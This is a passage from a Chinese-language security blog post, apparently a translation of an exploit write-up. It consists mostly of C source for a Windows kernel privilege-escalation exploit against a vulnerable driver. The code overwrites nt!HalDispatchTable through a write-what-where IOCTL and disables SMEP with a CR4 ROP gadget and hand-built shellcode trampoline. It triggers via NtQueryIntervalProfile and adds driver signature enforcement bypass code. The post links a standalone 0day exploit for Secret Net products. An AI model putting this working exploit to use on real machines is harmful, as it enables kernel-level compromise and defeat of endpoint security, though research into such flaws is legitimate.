class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            还原在利用期间被覆盖的HAL_DISPATCH::HalQuerySystemInformation指针</span></span><br><span class="line"><span class="comment">            由于hal!HalQuerySystemInformation()不可导出，因此很难找到它的原始地址。</span></span><br><span class="line"><span class="comment">            所以我们需要将其替换为在非分页内存池中分配的伪代码</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (m_HalDispatchTable-&gt;HalQuerySystemInformation = f_ExAllocatePool(NonPagedPool, TEMP_CODE_LEN))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(m_HalDispatchTable-&gt;HalQuerySystemInformation, TempCode, TEMP_CODE_LEN);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (m_Handler)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 调用外部ring0 payload handler (如果有)</span></span><br><span class="line">        m_Handler(m_HandlerContext);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    m_bExplOk = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    在插入原始hal!HalQuerySystemInformation()的过程中会调用此函数，因为该地址在          </span></span><br><span class="line"><span class="comment">    nt!HalDispatchTable内核结构体中已经使用了&quot;write-what-where&quot;漏洞进行覆盖</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">NTSTATUS WINAPI _r0_proc_HalQuerySystemInformation(</span><br><span class="line">    ULONG InformationClass,</span><br><span class="line">    ULONG BufferSize,</span><br><span class="line">    PVOID Buffer,</span><br><span class="line">    PULONG ReturnedLength)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// execute exploitation payload</span></span><br><span class="line">    _r0_proc_continue();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">BOOL <span class="title function_">expl_SNCC0_Sys_220010</span><span class="params">(KERNEL_EXPL_HANDLER Handler, PVOID HandlerContext)</span></span><br><span class="line">&#123;</span><br><span class="line">    BOOL bUseRop = FALSE;</span><br><span class="line"> </span><br><span class="line">    m_Handler = Handler;</span><br><span class="line">    m_HandlerContext = HandlerContext;</span><br><span class="line"> </span><br><span class="line">    OSVERSIONINFOA Version;</span><br><span class="line">    Version.dwOSVersionInfoSize = <span class="keyword">sizeof</span>(OSVERSIONINFOA);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// get NT verson information</span></span><br><span class="line">    <span class="keyword">if</span> (GetVersionExA(&amp;Version))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Version.dwPlatformId == VER_PLATFORM_WIN32_NT)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;NT version is %d.%d.%d\n&quot;</span>, Version.dwMajorVersion,</span><br><span class="line">                   Version.dwMinorVersion, Version.dwBuildNumber);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// 确定是否需要使用 ROP 来绕过 SMEP</span></span><br><span class="line">            <span class="keyword">if</span> ((Version.dwMajorVersion == <span class="number">6</span> &amp;&amp; Version.dwMinorVersion == <span class="number">2</span>) ||</span><br><span class="line">                (Version.dwMajorVersion == <span class="number">6</span> &amp;&amp; Version.dwMinorVersion == <span class="number">3</span>) ||</span><br><span class="line">                (Version.dwMajorVersion == <span class="number">10</span> &amp;&amp; Version.dwMinorVersion == <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                bUseRop = TRUE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// get real address of nt!ExAllocatePool()</span></span><br><span class="line">    f_ExAllocatePool = (func_ExAllocatePool)KernelGetProcAddr(<span class="string">&quot;ExAllocatePool&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f_ExAllocatePool == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// get real address of nt!HalDispatchTable</span></span><br><span class="line">    m_HalDispatchTable = (PHAL_DISPATCH)KernelGetProcAddr(<span class="string">&quot;HalDispatchTable&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (m_HalDispatchTable == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nt!ExAllocatePool() is at &quot;</span>IFMT<span class="string">&quot;\n&quot;</span>, f_ExAllocatePool);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nt!HalDispatchTable is at &quot;</span>IFMT<span class="string">&quot;\n&quot;</span>, m_HalDispatchTable);</span><br><span class="line"> </span><br><span class="line">    LARGE_INTEGER Val;</span><br><span class="line">    PVOID Trampoline = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD_PTR Addr = PAGE_SIZE;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (bUseRop)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 在内核可执行image中找到MOV CR4，RAX gadget的RVA</span></span><br><span class="line">        <span class="keyword">if</span> (!RopGadgetInit())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">goto</span> end;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        Val.QuadPart = (DWORD64)m_Rop_Mov_Cr4;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            由于ROP的限制，我们需要在4GB以下的虚拟内存空间分配shellcode跳转点</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (Trampoline = VirtualAlloc(Addr, PAGE_SIZE,</span><br><span class="line">                             MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Shellcode trampoline is allocated at &quot;</span>IFMT<span class="string">&quot;\n&quot;</span>, Trampoline);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (Addr &gt;= <span class="number">0x7fff0000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// unable to allocate memory</span></span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// try next address</span></span><br><span class="line">                Addr += PAGE_SIZE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// PUSH RAX</span></span><br><span class="line">        *(PUCHAR)(Trampoline) = <span class="number">0x50</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// MOV RAX, _r0_proc_continue</span></span><br><span class="line">        *(PWORD)((DWORD_PTR)Trampoline + <span class="number">1</span>) = <span class="number">0xb848</span>;</span><br><span class="line">        *(PDWORD_PTR)((DWORD_PTR)Trampoline + <span class="number">0x03</span>) = (DWORD_PTR)&amp;_r0_proc_continue;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// CALL RAX ; calls _r0_proc_continue()</span></span><br><span class="line">        *(PWORD)((DWORD_PTR)Trampoline + <span class="number">0x0b</span>) = <span class="number">0xd0ff</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// POP RAX</span></span><br><span class="line">        *(PUCHAR)((DWORD_PTR)Trampoline + <span class="number">0x0d</span>) = <span class="number">0x58</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// ADD RSP, 20h ; restore proper stack pointer value</span></span><br><span class="line">        *(PDWORD)((DWORD_PTR)Trampoline + <span class="number">0x0e</span>) = <span class="number">0x20c48348</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// RET ; return back to the nt!NtQueryntervalProfile()</span></span><br><span class="line">        *(PUCHAR)((DWORD_PTR)Trampoline + <span class="number">0x12</span>) = <span class="number">0xc3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Val.QuadPart = (DWORD64)&amp;_r0_proc_HalQuerySystemInformation;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Opengin device \&quot;%s\&quot;...\n&quot;</span>, EXPL_DEVICE_PATH);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取目标设备的handle</span></span><br><span class="line">    HANDLE hDev = CreateFile(_T(EXPL_DEVICE_PATH), GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">                             <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (hDev == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    DWORD ns = <span class="number">0</span>, dwCode = EXPL_CONTROL_CODE;</span><br><span class="line">    IO_STATUS_BLOCK StatusBlock;</span><br><span class="line">    UCHAR Buff[EXPL_BUFF_SIZE];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Buff = &quot;</span>IFMT<span class="string">&quot;\n&quot;</span>, &amp;Buff);</span><br><span class="line"> </span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> SEND_IOCTL(_code_, _ib_, _il_, _ob_, _ol_)          \</span></span><br><span class="line"><span class="meta">                                                                \</span></span><br><span class="line"><span class="meta">        ns = NtDeviceIoControlFile(                             \</span></span><br><span class="line"><span class="meta">            hDev, NULL, NULL, NULL, &amp;StatusBlock, (_code_),     \</span></span><br><span class="line"><span class="meta">            (PVOID)(_ib_), (DWORD)(_il_),                       \</span></span><br><span class="line"><span class="meta">            (PVOID)(_ob_), (DWORD)(_ol_)                        \</span></span><br><span class="line"><span class="meta">        );                                                      \</span></span><br><span class="line"><span class="meta">                                                                \</span></span><br><span class="line"><span class="meta">        printf(                                                 \</span></span><br><span class="line"><span class="meta">            <span class="string">&quot;IOCTL 0x%.8x: status = 0x%.8x, info = 0x%.8x\n&quot;</span>,   \</span></span><br><span class="line"><span class="meta">            (_code_), ns, StatusBlock.Information               \</span></span><br><span class="line"><span class="meta">        );</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _AMD64_</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        用其他参数值填充IOCTL输入缓冲区，这些参数值会在有漏洞的IOCTL handler中处理</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    ZeroMemory(Buff, <span class="keyword">sizeof</span>(Buff));</span><br><span class="line"> </span><br><span class="line">    *(PDWORD64)&amp;Buff[<span class="number">0x00</span>] = (DWORD64)m_HalDispatchTable - <span class="number">0x10</span>;</span><br><span class="line">    *(PDWORD)&amp;Buff[<span class="number">0x58</span>] = Val.LowPart;</span><br><span class="line">    *(PDWORD)&amp;Buff[<span class="number">0x5c</span>] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 调用有漏洞的驱动程序，并覆盖HAL_DISPATCH::HalQuerySystemInformation指针</span></span><br><span class="line">    SEND_IOCTL(dwCode, (PVOID)&amp;Buff, <span class="keyword">sizeof</span>(Buff), (PVOID)&amp;Buff, <span class="keyword">sizeof</span>(Buff));</span><br><span class="line"> </span><br><span class="line">    *(PDWORD64)&amp;Buff[<span class="number">0x00</span>] += <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">    *(PDWORD)&amp;Buff[<span class="number">0x58</span>] = Val.HighPart;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 覆盖64位指针的第二个双字</span></span><br><span class="line">    SEND_IOCTL(dwCode, (PVOID)&amp;Buff, <span class="keyword">sizeof</span>(Buff), (PVOID)&amp;Buff, <span class="keyword">sizeof</span>(Buff));</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (bUseRop)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Use SMEP bypass.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        DWORD FeaturesEcx = <span class="number">0</span>, FeaturesEdx = <span class="number">0</span>, FeaturesEbx = <span class="number">0</span>;</span><br><span class="line">        DWORD ExtFeaturesEcx = <span class="number">0</span>, ExtFeaturesEdx = <span class="number">0</span>, ExtFeaturesEbx = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 获取CPU功能位和扩展功能位</span></span><br><span class="line">        GetCPUIDFeatureBits(<span class="number">0x00000001</span>, &amp;FeaturesEcx, &amp;FeaturesEdx, &amp;FeaturesEbx);</span><br><span class="line">        GetCPUIDFeatureBits(<span class="number">0x00000007</span>, &amp;ExtFeaturesEcx, &amp;ExtFeaturesEdx, &amp;ExtFeaturesEbx);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CPUID: EAX = 0x00000001, EDX = 0x%.8x, ECX = 0x%.8x\n&quot;</span>,</span><br><span class="line">               FeaturesEdx, FeaturesEcx);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CPUID: EAX = 0x00000007, EBX = 0x%.8x, ECX = 0x%.8x\n&quot;</span>,</span><br><span class="line">               ExtFeaturesEbx, ExtFeaturesEcx);</span><br><span class="line"> </span><br><span class="line">        DWORD InfoSize = <span class="number">0</span>;</span><br><span class="line">        SYSTEM_PROCESSOR_INFORMATION ProcessorInfo;</span><br><span class="line">        ProcessorInfo.ProcessorFeatureBits = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">        ns = NtQuerySystemInformation(</span><br><span class="line">            SystemProcessorInformation, &amp;ProcessorInfo, <span class="keyword">sizeof</span>(ProcessorInfo), &amp;InfoSize);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (NT_SUCCESS(ns))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ProcessorFeatureBits is 0x%.8x\n&quot;</span>, ProcessorInfo.ProcessorFeatureBits);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            计算当前CR4寄存器实际的值，在MOV CR4, EAX gadget中使用该值禁用SMEP</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        DWORD Cr4Value = CR4_VME | CR4_DE | CR4_PAE | CR4_MCE | CR4_FXSR | CR4_XMMEXCPT;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (FeaturesEcx &amp; CPUID_OSXSAVE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// XSAVE and processor extended states - enable bit</span></span><br><span class="line">            Cr4Value |= CR4_OSXSAVE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (FeaturesEcx &amp; CPUID_VMX)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Virtual Machine eXtensions are supported</span></span><br><span class="line">            Cr4Value |= CR4_VMXE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (ExtFeaturesEbx &amp; CPUID_FSGSBASE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// RDFSBASE/RDGSBASE/etc. instructions are supported</span></span><br><span class="line">            Cr4Value |= CR4_FSGSBASE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (ProcessorInfo.ProcessorFeatureBits &amp; KF_LARGE_PAGE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Page Size Extensions are supported</span></span><br><span class="line">            Cr4Value |= CR4_PSE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (ProcessorInfo.ProcessorFeatureBits &amp; KF_GLOBAL_PAGE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Page Global Enabled</span></span><br><span class="line">            Cr4Value |= CR4_PGE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;New CR4 value is 0x%.8x\n&quot;</span>, Cr4Value);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// run current thread only on first CPU</span></span><br><span class="line">        SetThreadAffinityMask(GetCurrentThread(), <span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            NtQueryIntervalProfile() calls nt!KeQueryIntervalProfile() that calls</span></span><br><span class="line"><span class="comment">            overwritten HAL_DISPATCH::HalQuerySystemInformation pointer.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        DWORD_PTR Source = (DWORD_PTR)Trampoline;</span><br><span class="line">        NtQueryIntervalProfile(Source, &amp;Cr4Value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Don&#x27;t use SMEP bypass on Windows 7 and older systems.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        DWORD Interval = <span class="number">0</span>;</span><br><span class="line">        NtQueryIntervalProfile(ProfileTotalIssues, &amp;Interval);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">end:</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (Trampoline)</span><br><span class="line">    &#123;</span><br><span class="line">        VirtualFree(Trampoline, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (hDev)</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hDev);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (m_bExplOk)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(__FUNCTION__<span class="string">&quot;(): Exploitation success\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(__FUNCTION__<span class="string">&quot;() ERROR: Exploitation fails\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> m_bExplOk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外，我在fwexpl_app中添加了<code>--dse-bypass</code>选项，以提供加载未签名内核驱动程序支持：</p>
<p>如上所述，在利用内核驱动程序漏洞后，需要重新启用SMEP。为此，我在libfwexpl驱动程序中编写了以下由exp加载的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ... skipped ...</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">switch</span> (Code)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_DRV_CONTROL:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">switch</span> (Buff-&gt;Code)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="comment">// ... skipped ...</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_DSE_BYPASS</span></span><br><span class="line"> </span><br><span class="line">            <span class="keyword">case</span> DRV_CTL_RESTORE_CR4:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// get bitmask of active processors</span></span><br><span class="line">                    KAFFINITY ActiveProcessors = KeQueryActiveProcessors();</span><br><span class="line">                    ULONG cr4_val = <span class="number">0</span>, cr4_current = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">                    <span class="comment">// enumerate active processors starting from 2-nd</span></span><br><span class="line">                    <span class="keyword">for</span> (KAFFINITY i = <span class="number">1</span>; i &lt; <span class="keyword">sizeof</span>(KAFFINITY) * <span class="number">8</span>; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        KAFFINITY Mask = <span class="number">1</span> &lt;&lt; i;</span><br><span class="line"> </span><br><span class="line">                        <span class="keyword">if</span> (ActiveProcessors &amp; Mask)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">// bind thread to specific processor</span></span><br><span class="line">                            KeSetSystemAffinityThread(Mask);</span><br><span class="line"> </span><br><span class="line">                            <span class="comment">// read CR4 register value</span></span><br><span class="line">                            cr4_val = _cr4_get();</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"> </span><br><span class="line">                    <span class="keyword">if</span> (cr4_val != <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// bind thread to first processor</span></span><br><span class="line">                        KeSetSystemAffinityThread(<span class="number">0x00000001</span>);</span><br><span class="line"> </span><br><span class="line">                        <span class="comment">// read CR4 register value</span></span><br><span class="line">                        cr4_current = _cr4_get();</span><br><span class="line"> </span><br><span class="line">                        <span class="keyword">if</span> (cr4_current != cr4_val)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="comment">// restore CR4 register value</span></span><br><span class="line">                            _cr4_set(cr4_val);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            DbgMsg(__FILE__, __LINE__, <span class="string">&quot;CR4 is 0x%.8x\n&quot;</span>, cr4_current);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                        ns = STATUS_SUCCESS;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        DbgMsg(__FILE__, __LINE__, <span class="string">&quot;ERROR: Unable to read CR4 value from 2-nd processor\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"> </span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// USE_DSE_BYPASS</span></span></span><br><span class="line"> </span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// ... skipped ...</span></span><br></pre></td></tr></table></figure>

<p>Secret Net 7.4和Secret Net Studio 8 0day漏洞的独立版本的本地提权可查看单独的<a target="_blank" rel="noopener" href="https://github.com/Cr4sh/secretnet_expl">GitHub项目</a>。</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left  disabled "
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/project/2023/08/09/%E5%88%A9%E7%94%A8DMA%E6%94%BB%E5%87%BB%E7%AA%81%E7%A0%B4UEFI%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"
      title="利用DMA攻击突破UEFI安全机制"
     >

    <p class="title-text">
      
        利用DMA攻击突破UEFI安全机制
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>


  
  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
  <div id="comment-card" class="comment-card">
    <div class="main-title-bar">
      <div class="main-title-dot"></div>
      <div class="main-title">留言 </div>
    </div>
    <div id="vcomments"></div>
  </div>
  <script>
      new Valine({"enable":true,"appId":"bC8HOSKa4QB7G6TfuGWB97i4-gzGzoHsz","appKey":"aoDFuSX5vWN8Xn1ukZpJ50be","placeholder":"写下你的评论...","pageSize":10,"highlight":true,"serverURLs":null,"el":"#vcomments"});
  </script>
 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2023 Edvison<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.style.opacity = 1;
        } else {
            btn.style.opacity = 0;
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/project/js/light-dark-switch.js"></script>
</body>
</html>
